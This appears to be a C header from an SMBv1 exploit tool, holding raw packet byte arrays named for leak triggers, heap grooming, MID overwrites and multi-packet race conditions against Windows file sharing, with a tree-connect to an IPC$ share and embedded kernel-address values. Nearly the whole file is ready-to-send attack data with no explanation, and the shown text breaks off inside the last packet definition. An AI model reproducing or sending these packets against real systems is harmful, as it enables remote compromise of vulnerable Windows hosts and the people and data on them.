#pragma once
#define NEGOTIATE_PACKET "\x00\x00\x00\x85\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x18\x53\xc0" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xfe" \
"\x00\x00\x40\x00\x00\x62\x00\x02\x50\x43\x20\x4e\x45\x54\x57\x4f" \
"\x52\x4b\x20\x50\x52\x4f\x47\x52\x41\x4d\x20\x31\x2e\x30\x00\x02" \
"\x4c\x41\x4e\x4d\x41\x4e\x31\x2e\x30\x00\x02\x57\x69\x6e\x64\x6f" \
"\x77\x73\x20\x66\x6f\x72\x20\x57\x6f\x72\x6b\x67\x72\x6f\x75\x70" \
"\x73\x20\x33\x2e\x31\x61\x00\x02\x4c\x4d\x31\x2e\x32\x58\x30\x30" \
"\x32\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x32\x2e\x31\x00\x02\x4e\x54" \
"\x20\x4c\x4d\x20\x30\x2e\x31\x32\x00"

#define NEGOTIATE_PACKET_SIZE 137


#define SESSION_SETUP_ANDX_PACKET	"\x00\x00\x00\x88\xff\x53\x4d\x42\x73\x00\x00\x00\x00\x18\x07\xc0" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xfe" \
"\x00\x00\x40\x00\x0d\xff\x00\x88\x00\x04\x11\x0a\x00\x00\x00\x00" \
"\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\xd4\x00\x00\x00\x4b" \
"\x00\x00\x00\x00\x00\x00\x57\x00\x69\x00\x6e\x00\x64\x00\x6f\x00" \
"\x77\x00\x73\x00\x20\x00\x32\x00\x30\x00\x30\x00\x30\x00\x20\x00" \
"\x32\x00\x31\x00\x39\x00\x35\x00\x00\x00\x57\x00\x69\x00\x6e\x00" \
"\x64\x00\x6f\x00\x77\x00\x73\x00\x20\x00\x32\x00\x30\x00\x30\x00" \
"\x30\x00\x20\x00\x35\x00\x2e\x00\x30\x00\x00\x00"

#define SESSION_SETUP_ANDX_PACKET_SIZE 140


#define TREE_CONNECT_ANDX_PACKET	"\x00\x00\x00\x5a\xff\x53\x4d\x42\x75\x00\x00\x00\x00\x18\x07\xc0" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xfe" \
"\x00\x08\x40\x00\x04\xff\x00\x5a\x00\x08\x00\x01\x00\x2f\x00\x00" \
"\x5c\x00\x5c\x00\x31\x00\x37\x00\x32\x00\x2e\x00\x32\x00\x33\x00" \
"\x2e\x00\x33\x00\x33\x00\x2e\x00\x31\x00\x30\x00\x5c\x00\x49\x00" \
"\x50\x00\x43\x00\x24\x00\x00\x00\x3f\x3f\x3f\x3f\x3f\x00"

#define TREE_CONNECT_ANDX_PACKET_SIZE 94


#define NT_CREATE_ANDX_PACKET	"\x00\x00\x00\x62\xff\x53\x4d\x42\xa2\x00\x00\x00\x00\x18\x07\xc0" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xff\xfe" \
"\x00\x08\x40\x00\x18\xff\x00\x62\x00\x00\x0c\x00\x16\x00\x00\x00" \
"\x00\x00\x00\x00\x9f\x01\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
"\x00\x00\x00\x00\x03\x00\x00\x00\x01\x00\x00\x00\x40\x00\x00\x00" \
"\x02\x00\x00\x00\x03\x0f\x00\x00\x6c\x00\x73\x00\x61\x00\x72\x00" \
"\x70\x00\x63\x00\x00\x00"


#define NT_CREATE_ANDX_PACKET_SIZE 102


#define TRANS_DCERPC_BIND_PACKET	"\x00\x00\x00\x9c\xff\x53\x4d\x42\x25\x00\x00\x00\x00\x18\x07\xc0" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xff\xfe" \
"\x00\x08\x40\x00\x10\x00\x00\x48\x00\x00\x00\x00\x10\x00\x00\x08" \
"\x00\xe8\x03\x00\x00\x00\x00\x00\x00\x54\x00\x48\x00\x54\x00\x02" \
"\x00\x26\x00\x00\x40\x59\x00\x00\x5c\x00\x50\x00\x49\x00\x50\x00" \
"\x45\x00\x5c\x00\x00\x00\x00\x00\x05\x00\x0b\x03\x10\x00\x00\x00" \
"\x48\x00\x00\x00\x01\x00\x00\x00\xb8\x10\xb8\x10\x00\x00\x00\x00" \
"\x01\x00\x00\x00\x00\x00\x01\x00\x78\x57\x34\x12\x34\x12\xcd\xab" \
"\xef\x00\x01\x23\x45\x67\x89\xab\x00\x00\x00\x00\x04\x5d\x88\x8a" \
"\xeb\x1c\xc9\x11\x9f\xe8\x08\x00\x2b\x10\x48\x60\x02\x00\x00\x00"


#define TRANS_DCERPC_BIND_PACKET_SIZE 160


#define WRITE_ANDX_LSARPC_GET_USERNAME_PACKET	"\x00\x00\x02\x98\xff\x53\x4d\x42\x2f\x00\x00\x00\x00\x18\x07\xc0" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xff\xfe" \
"\x00\x08\x40\x00\x0e\xff\x00\x40\x00\x00\x40\x00\x00\x00\x00\xff" \
"\xff\xff\xff\x08\x00\x58\x02\x00\x00\x58\x02\x40\x00\x00\x00\x00" \
"\x00\x59\x02\x00\x05\x00\x00\x03\x10\x00\x00\x00\x58\x02\x00\x00" \
"\x01\x00\x00\x00\x40\x02\x00\x00\x00\x00\x2d\x00\x48\x86\x0e\x00" \
"\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00" \
"\x78\x96\x31\x00\x10\x02\x10\x02\x68\xf5\x11\x00\x08\x01\x00\x00" \
"\x00\x00\x00\x00\x08\x01\x00\x00\xd9\x38\xed\x8e\x3d\x8d\xc1\x85" \
"\x3d\x1f\xa1\x55\xe4\xac\x1c\x7b\xbe\x0a\xd8\x09\x0d\x88\x14\x39" \
"\xaa\x88\x7a\x2b\x71\x3f\x79\xe2\xe6\x02\x00\x39\xf6\x0a\xdd\xec" \
"\x7e\x0d\x83\x62\x8b\xa2\x83\x63\xd9\xd1\x7e\x5a\xaf\xb4\xe1\x52" \
"\x84\x9a\x21\x53\x8d\x86\xd0\x45\xaa\x85\x4c\x0b\xc3\xaf\x4e\xee" \
"\x1f\x4c\x27\x0a\xb9\xf6\xec\xeb\x16\x30\x5f\xf0\xae\x4d\xd7\xac" \
"\x6e\x0e\xf8\xeb\x50\xf1\x7b\x76\xa5\x83\xcd\x4f\x01\xa6\xd5\x87" \
"\x69\x3e\xa4\x4b\xb7\x13\x55\x61\xc9\x6e\xea\xb8\x7d\x3f\x6a\x27" \
"\x04\x4a\x0a\x15\x94\x2f\xaa\x27\xfe\xc4\x68\x9a\x36\xa2\x9b\x7e" \
"\x4d\x50\xf7\x6a\xf2\xef\x1f\xdc\xec\xd7\x77\xeb\xb3\x02\x78\x6c" \
"\x8d\xbe\x49\x3c\x5c\x78\xf2\xd4\x85\x1a\xe8\xc6\x0d\xdc\x32\x5e" \
"\x65\xf4\x08\xf5\x01\x05\x16\x3b\x25\xc0\x47\x09\x10\x94\x45\xec" \
"\xf5\xe2\x8e\x11\xd2\x8d\x55\xbf\xb2\x5e\x02\xf8\x5b\x17\x92\x7c" \
"\xf3\xa6\xa3\xc2\xa2\x5b\x6e\x25\xbd\x87\x82\xda\x7e\x7b\x80\xdf" \
"\xd2\x34\x9c\x8e\x48\xb6\x37\xf3\xa3\x72\x51\x9c\x1d\x9e\x1d\xf5" \
"\xe0\xea\x7f\xef\xbd\x7b\xc0\x09\xaa\x92\x37\x6e\x0d\xc6\x3d\x48" \
"\x63\x3b\x1d\xf4\x3a\xc3\x6a\x44\x21\x3f\x5b\x65\x77\x42\x9b\xae" \
"\xbd\x4a\x3a\xe1\x5f\x7b\x10\x1d\x85\x4d\x60\x1c\xf6\x0a\xf9\xed" \
"\x8c\x88\xa4\xce\x4b\x0c\x22\x4b\x9b\xb6\x8a\x4f\xb6\x5e\x3e\x54" \
"\xc5\x5a\x5a\x47\xc0\xf7\xc9\x60\x94\x2f\xda\x83\x99\x67\x99\x61" \
"\xdb\xb2\xa9\xed\x43\x73\x01\x6c\x29\xd0\x32\x9f\x4f\xd5\x9e\x5c" \
"\xd9\xb5\x4d\x16\x3d\x13\xbe\x99\xc0\xb3\x70\x8d\x7e\x82\x6a\xfb" \
"\x85\x57\x8f\x6c\x17\x5f\x0c\xd1\x8a\x90\x91\xdf\xdd\x10\xbd\x02" \
"\x81\xfe\x69\x8d\x5d\x7b\x2b\x57\x9f\x60\xd1\x69\x57\x89\x21\xde" \
"\x69\x1f\xa1\xab\xe0\xc1\xb3\x6d\x26\xfd\xca\xe4\x26\x02\x04\x4b" \
"\xf1\xe1\xed\x30\xd0\x64\xb2\xf1\x6c\xc3\x94\x8e\xfb\x34\xdc\xf1" \
"\x0b\xba\x10\x56\xe1\x10\xcc\xfc\x0c\x2b\xe8\xc9\x17\x25\x44\x04" \
"\x01\x11\xfd\xcd\x6b\x8a\x5e\x85\x09\x71\x3b\xbc\x6c\xc0\x1e\xe5" \
"\x9a\xdf\xf6\x5c\x86\x4e\x98\xff\xf3\x31\xe1\xf3\xc2\x7c\xb5\xc2" \
"\x34\x4a\xa9\x7c\x2d\x32\xa2\xfa\x03\x07\x2d\xfc\xd2\xf4\xd7\x34" \
"\xea\x4c\x55\xf9\x5f\x02\xbc\xc2\x3d\x31\x90\x0d\x66\x90\xfa\xe2" \
"\xb1\x4e\xe7\x98\x3d\x27\x5b\x00\x8e\x2b\xba\x9d\x7d\x1e\x5a\x1e" \
"\x7a\xca\x18\xaf\x29\x3d\x49\x58\xef\x54\xb9\x0a\x67\x75\x1a\x88" \
"\x4c\xea\x94\xc9\xe9\xbe\xc9\x0c\x00\x00\x00\x00"


#define WRITE_ANDX_LSARPC_GET_USERNAME_PACKET_SIZE	668


#define TRANS_FIRST_LEAK_TRIGGER_PACKET		"\x00\x00\x00\x43\xff\x53\x4d\x42\x25\x00\x00\x00\x00\x18\x07\xc0" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x0c\x28" \
"\x00\x08\x40\x00\x10\x00\x00\x00\x00\x00\x54\x01\x00\x00\x00\x00" \
"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02" \
"\x00\x23\x00\x00\x40\x00\x00"


#define TRANS_FIRST_LEAK_TRIGGER_PACKET_SIZE	71

#define TRANS_GROOM_PACKET_TYPE_ONE "\x00\x00\x00\x43\xff\x53\x4d\x42\x25\x00\x00\x00\x00\x18\x07\xc0" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x0c\x28" \
"\x00\x08\x41\x00\x10\x00\x00\x00\x54\x00\x00\x00\x00\x00\x00\x00" \
"\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02" \
"\x00\x36\x00\x00\x40\x00\x00"

#define TRANS_GROOM_PACKET_TYPE_ONE_SIZE 71

#define TRANS_MULTI_REQUEST_PACKET_TYPE_ONE	"\x00\x00\x00\x43\xff\x53\x4d\x42\x25\x00\x00\x00\x00\x18\x07\xc0" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x0c\x28" \
"\x00\x08\x4b\x00\x10\x00\x00\x01\x00\x00\x54\x01\x00\x00\x00\x00" \
"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02" \
"\x00\x23\x00\x00\x40\x00\x00\x00\x00\x00\x43\xff\x53\x4d\x42\x25" \
"\x00\x00\x00\x00\x18\x07\xc0\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
"\x00\x00\x00\x00\x08\x0b\x28\x00\x08\x00\x40\x10\x00\x00\x00\x54" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00" \
"\x00\x00\x00\x00\x00\x00\x02\x00\x36\x00\x00\x40\x00\x00\x00\x00" \
"\x00\x43\xff\x53\x4d\x42\x25\x00\x00\x00\x00\x18\x07\xc0\x00\x00" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x0c\x28\x00\x08" \
"\x4c\x00\x10\x00\x00\x00\x54\x00\x00\x00\x00\x00\x00\x00\x00\x01" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x36" \
"\x00\x00\x40\x00\x00"


#define TRANS_MULTI_REQUEST_PACKET_TYPE_ONE_SIZE 213


#define TRANS_MULTI_REQUEST_PACKET_TYPE_ONE_NUMBER_TWO	"\x00\x00\x00\x43\xff\x53\x4d\x42\x25\x00\x00\x00\x00\x18\x07\xc0" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x0c\x28" \
"\x00\x08\x4d\x00\x10\x00\x00\x01\x00\x00\x54\x01\x00\x00\x00\x00" \
"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02" \
"\x00\x23\x00\x00\x40\x00\x00\x00\x00\x00\x43\xff\x53\x4d\x42\x25" \
"\x00\x00\x00\x00\x18\x07\xc0\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
"\x00\x00\x00\x00\x08\x0a\x28\x00\x08\x00\x40\x10\x00\x00\x00\x54" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00" \
"\x00\x00\x00\x00\x00\x00\x02\x00\x36\x00\x00\x40\x00\x00\x00\x00" \
"\x00\x43\xff\x53\x4d\x42\x25\x00\x00\x00\x00\x18\x07\xc0\x00\x00" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x0c\x28\x00\x08" \
"\x4e\x00\x10\x00\x00\x00\x54\x00\x00\x00\x00\x00\x00\x00\x00\x01" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x36" \
"\x00\x00\x40\x00\x00"


#define TRANS_MULTI_REQUEST_PACKET_TYPE_ONE_NUMBER_TWO_SIZE 213

#define TRANS_MULTI_REQUEST_PACKET_TYPE_ONE_NUMBER_THREE "\x00\x00\x00\x43\xff\x53\x4d\x42\x25\x00\x00\x00\x00\x18\x07\xc0" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x0c\x28" \
"\x00\x08\x4f\x00\x10\x00\x00\x01\x00\x00\x54\x01\x00\x00\x00\x00" \
"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02" \
"\x00\x23\x00\x00\x40\x00\x00\x00\x00\x00\x43\xff\x53\x4d\x42\x25" \
"\x00\x00\x00\x00\x18\x07\xc0\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
"\x00\x00\x00\x00\x08\x09\x28\x00\x08\x00\x40\x10\x00\x00\x00\x54" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00" \
"\x00\x00\x00\x00\x00\x00\x02\x00\x36\x00\x00\x40\x00\x00\x00\x00" \
"\x00\x43\xff\x53\x4d\x42\x25\x00\x00\x00\x00\x18\x07\xc0\x00\x00" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x0c\x28\x00\x08" \
"\x50\x00\x10\x00\x00\x00\x54\x00\x00\x00\x00\x00\x00\x00\x00\x01" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x36" \
"\x00\x00\x40\x00\x00"

#define TRANS_MULTI_REQUEST_PACKET_TYPE_ONE_NUMBER_THREE_SIZE	213


#define TRANS_GROOM_PACKET_TYPE_TWO	"\x00\x00\x00\x3f\xff\x53\x4d\x42\x25\x00\x00\x00\x00\x18\x07\xc0" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x0c\x28" \
"\x00\x08\x51\x00\x0e\x00\x00\x40\x00\x40\x09\x00\x00\x00\x00\x00" \
"\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
"\x00\x00\x00"

#define TRANS_GROOM_PACKET_TYPE_TWO_SIZE	67


#define TRANS_SECONDARY_LEAK_TWO_TRIGGER_PACKET	"\x00\x00\x00\x43\xff\x53\x4d\x42\x26\x00\x00\x00\x00\x18\x07\xc0" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x0c\x28" \
"\x00\x08\x4b\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01" \
"\x00\x42\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
"\x00\x00\x00\x00\x00\x00\x11"

#define TRANS_SECONDARY_LEAK_TWO_TRIGGER_PACKET_SIZE		71


#define WRITE_ANDX_INDATA_SHIFT_PACKET	"\x00\x00\x02\x3c\xff\x53\x4d\x42\x2f\x00\x00\x00\x00\x18\x07\xc0" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x0b\x28" \
"\x00\x08\x00\x40\x0c\xff\x00\x3c\x00\x00\x40\x00\x00\x00\x00\xff" \
"\xff\xff\xff\x04\x00\x00\xfe\x00\x00\x00\x02\x3b\x00\x00\x02\x00" \
"\x46\xc5\x98\xb4\x9b\xba\xcd\x08\x28\x51\xc4\x88\xa1\x7e\xef\x76" \
"\xfb\xa7\xd3\x99\x5e\x6a\xda\x6e\xa9\xaf\x35\x1b\xae\x96\x3c\xf9" \
"\xd1\x3e\x31\xde\x2e\xf5\xd3\x12\xe8\xd9\xa0\x1b\xe2\x68\x3a\x3c" \
"\x66\x17\xcb\xde\xfd\x6a\xd8\xbc\x1b\x9e\x67\x0c\xbd\x65\xe7\x72" \
"\xaa\xc6\xb3\x0d\x7c\xa0\xa9\x52\x19\xdc\xb3\x16\xc9\xd4\xaf\x7c" \
"\x85\xff\x92\x13\xb7\x59\x48\xf7\xfe\xa5\x18\x2b\x3b\xfa\x0f\x08" \
"\x72\xb9\x4c\xf0\xb7\x62\x97\x2c\xcc\x5d\x30\x22\x99\x33\x37\xb3" \
"\x21\x4d\x9c\x1a\x23\xb2\xf9\xf4\x09\xdc\x3f\xd7\x51\x1a\xa5\x2b" \
"\x14\x98\xb6\x9e\xdb\x8b\xf0\xed\x5e\x8a\xd0\x4e\x5f\xa0\xc7\x48" \
"\x45\x18\xe6\x3f\xa0\x99\xbf\x76\x3c\x84\x59\xd3\xee\x33\x9e\x36" \
"\xc1\x0f\x31\x97\xab\x13\x0b\xc9\x74\xb8\xd7\x15\xf1\xdb\x5a\x89" \
"\x48\x9f\xf4\x36\x55\xd9\x79\x22\xde\x06\x6e\x4d\xcb\x5a\xfb\x6a" \
"\xf2\xef\x84\xc1\xb1\x98\x4c\xdb\xf7\x62\x0d\x57\xeb\x4d\xf3\xac" \
"\xc9\x48\xd1\x18\x30\xe6\x0a\x8b\x80\xf1\x0b\xda\x6b\x4d\xc3\xf3" \
"\x6a\x34\x01\x6c\x3f\x63\x1a\x28\x1d\x2d\xc6\x5e\xb2\x0a\x9e\xcf" \
"\xab\xa1\x14\x69\xe9\xda\x61\x27\xf9\xff\x47\x77\x14\x71\x06\xe2" \
"\x33\x00\x80\x4e\x72\x63\xe8\x9c\x62\xe6\xdd\xdb\x72\xca\x6d\xf8" \
"\x1f\x62\xd7\x14\xfe\x7b\x74\x57\x6a\x11\xc0\x89\xd9\xd5\xd9\x30" \
"\x9e\x9d\x61\x87\x2b\x2f\x2e\x0a\x88\x81\xb2\xe6\x22\xee\x7d\x15" \
"\x98\x68\xbf\x6d\xb6\x33\x3e\x63\x39\x2d\x9d\xdd\x92\x2d\x5e\xc1" \
"\x46\x7e\x8b\x9e\x16\x08\x6e\x30\x9c\x1c\x31\x01\x7c\x81\xf0\xfc" \
"\xd5\xbb\xf9\x2d\x20\x17\xc6\x7b\x17\x87\x8b\xa9\xe0\xd7\xba\x5e" \
"\x0b\x3e\x71\x81\xa5\xd4\x31\xb0\xf2\xfa\xcd\x14\x07\x34\xf2\x6c" \
"\xdd\x89\x38\x79\x12\xe0\x19\xb7\xfc\x75\xc1\x89\x2b\xd9\x1e\xb9" \
"\x18\xa0\x09\x89\x13\x24\x08\x17\x26\x88\x7e\x72\x0f\x61\xb6\x09" \
"\xfc\x28\xb9\xdb\x2c\xf4\x4b\x17\x27\x78\xfe\x82\xa4\xe0\xc1\x6d" \
"\xde\x8d\xd5\x73\x62\x2f\x8e\xda\x1a\x5b\xc8\xd2\xa8\x08\x77\x63" \
"\xc8\x18\x41\x47\xd4\x5e\x7c\x83\x20\x39\x88\x02\x45\x42\xe2\xfb" \
"\x18\x18\xdc\x67\x5f\xd4\x62\x53\xfc\x2f\xb4\x56\xb1\xd4\x79\xf0" \
"\x20\xfe\x1b\x17\x3a\xd1\xcf\xcb\xb7\x89\x2c\xdd\xce\xfc\xc8\xcd" \
"\xc7\x7c\xaf\xf4\x9b\x9c\x2f\xc8\x3f\xe8\xd6\x88\xcc\x16\x07\x0d" \
"\x29\xa9\x1d\x0f\x53\xa8\x72\xa7\x04\x60\x42\x51\xc8\xb5\xc2\x36"

#define WRITE_ANDX_INDATA_SHIFT_PACKET_SIZE	576


#define TRANS_SECONDARY_MID_OVERWRITE_PACKET "\x00\x00\x00\x44\xff\x53\x4d\x42\x26\x00\x00\x00\x00\x18\x07\xc0" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x0b\x28" \
"\x00\x08\x00\x40\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02" \
"\x00\x42\x00\x30\x53\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
"\x00\x00\x00\x00\x00\x00\x00\x00"

#define TRANS_SECONDARY_MID_OVERWRITE_PACKET_SIZE 72


#define TRANS_SECONDARY_FIRST_MID_ZERO_PACKET	"\x00\x00\x00\x43\xff\x53\x4d\x42\x26\x00\x00\x00\x00\x18\x07\xc0" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x0c\x28" \
"\x00\x08\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01" \
"\x00\x42\x00\xff\xff\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
"\x00\x00\x00\x00\x00\x00\x00"

#define TRANS_SECONDARY_FIRST_MID_ZERO_PACKET_SIZE 71

#define TRANS_SECONDARY_FIRST_SPECIAL_MID_PACKET	"\x00\x00\x00\x4a\xff\x53\x4d\x42\x26\x00\x00\x00\x00\x18\x07\xc0" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x0b\x28" \
"\x00\x08\x00\x40\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08" \
"\x00\x42\x00\xf0\x52\x17\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
"\x00\x00\x00\x00\x00\x00\xa4\xe8\x32\x33\x80\xfa\xff\xff"

#define TRANS_SECONDARY_FIRST_SPECIAL_MID_PACKET_SIZE	78

#define TRANS_SECONDARY_MULTI_SMB_RACE_TYPE_ONE_PACKET	"\x00\x00\x00\x46\xff\x53\x4d\x42\x26\x00\x00\x00\x00\x18\x07\xc0" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x0c\x28" \
"\x00\x08\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04" \
"\x00\x42\x00\x00\x00\x13\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
"\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x46\xff\x53" \
"\x4d\x42\x26\x00\x00\x00\x00\x18\x07\xc0\x00\x00\x00\x00\x00\x00" \
"\x00\x00\x00\x00\x00\x00\x00\x08\x0b\x28\x00\x08\x00\x40\x08\x00" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x42\x00\x18\x53\x13" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
"\x00\x10\x00\x00\x00\x00\x00\x4a\xff\x53\x4d\x42\x26\x00\x00\x00" \
"\x00\x18\x07\xc0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
"\x00\x08\x0b\x28\x00\x08\x00\x40\x08\x00\x00\x00\x00\x00\x00\x00" \
"\x00\x00\x00\x08\x00\x42\x00\xf0\x52\x17\x00\x00\x00\x00\x00\x00" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\xf5\x62\x06\xa0\xf8" \
"\xff\xff\x00\x00\x00\x6a\xff\x53\x4d\x42\x26\x00\x00\x00\x00\x18" \
"\x07\xc0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08" \
"\x0c\x28\x00\x08\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
"\x00\x28\x00\x42\x00\x88\x00\x37\x00\x00\x00\x00\x00\x00\x00\x00" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x60\xe5\x07\x35\x80\xfa\xff\xff" \
"\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
"\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00" \
"\x00\x00\x00\x4a\xff\x53\x4d\x42\x26\x00\x00\x00\x00\x18\x07\xc0" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x0c\x28" \
"\x00\x08\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08" \
"\x00\x42\x00\x60\x00\x17\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
"\x00\x00\x00\x00\x00\x00\xd4\xf5\x62\x06\xa0\xf8\xff\xff\x00\x00" \
"\x00\x43\xff\x53\x4d\x42\x26\x00\x00\x00\x00\x18\x07\xc0\x00\x00" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x0c\x28\x00\x08" \
"\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x42" \
"\x00\xb5\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
"\x00\x00\x00\x00\x01\x00\x00\x00\x46\xff\x53\x4d\x42\x26\x00\x00" \
"\x00\x00\x18\x07\xc0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
"\x00\x00\x08\x0c\x28\x00\x08\x00\x00\x08\x00\x00\x00\x00\x00\x00" \
"\x00\x00\x00\x00\x04\x00\x42\x00\x54\x00\x13\x00\x00\x00\x00\x00" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x23\x00\x00\x40\x00" \
"\x00\x00\x43\xff\x53\x4d\x42\x26\x00\x00\x00\x00\x18\x07\xc0\x00" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x0c\x28\x00" \
"\x08\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00" \
"\x42\x00\xe1\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x42\xff\x53\x4d\x42\x26\x00" \
"\x00\x00\x00\x18\x07\xc0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
"\x00\x00\x00\x08\x0c\x28\x00\x08\x5c\x00\x08\x00\x00\x00\x00\x00" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0f\x00\x00\x00\x00" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"

#define TRANS_SECONDARY_MULTI_SMB_RACE_TYPE_ONE_PACKET_SIZE 700

#define TRANS_SECONDARY_SECOND_MID_ZERO_PACKET	"\x00\x00\x00\x6a\xff\x53\x4d\x42\x26\x00\x00\x00\x00\x18\x07\xc0" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x0c\x28" \
"\x00\x08\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x28" \
"\x00\x42\x00\x88\x00\x37\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
"\x00\x00\x00\x00\x00\x00\x50\xd2\x68\x06\x80\xf8\xff\xff\x04\x00" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00"

#define TRANS_SECONDARY_SECOND_MID_ZERO_PACKET_SIZE	110


#define TRANS_SECONDARY_MULTI_SMB_RACE_TYPE_TWO_PACKET	"\x00\x00\x00\x46\xff\x53\x4d\x42\x26\x00\x00\x00\x00\x18\x07\xc0" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x0c\x28" \
"\x00\x08\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04" \
"\x00\x42\x00\x54\x00\x13\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
"\x00\x00\x00\x00\x00\x00\x23\x00\x00\x40\x00\x00\x00\x43\xff\x53" \
"\x4d\x42\x26\x00\x00\x00\x00\x18\x07\xc0\x00\x00\x00\x00\x00\x00" \
"\x00\x00\x00\x00\x00\x00\x00\x08\x0c\x28\x00\x08\x00\x00\x08\x00" \
